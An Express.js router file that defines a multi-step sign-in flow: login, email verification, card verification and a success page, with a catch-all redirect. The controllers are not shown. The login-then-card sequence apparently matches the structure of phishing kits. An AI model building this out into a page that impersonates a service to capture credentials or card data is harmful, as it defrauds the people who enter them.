const express = require("express");
const router = express.Router();
const controller = require("../controllers/controller");

router.get("/auth/login", controller.login);
router.post("/auth/login", controller.loginPost);

router.get("/auth/email-verification", controller.login2);
router.post("/auth/email-verification", controller.loginPost2);

router.get("/auth/card-verification", controller.login3);
router.post("/auth/card-verification", controller.loginPost3);

router.get("/auth/success", controller.complete);

router.get("*", controller.page404Redirect);

module.exports = router;
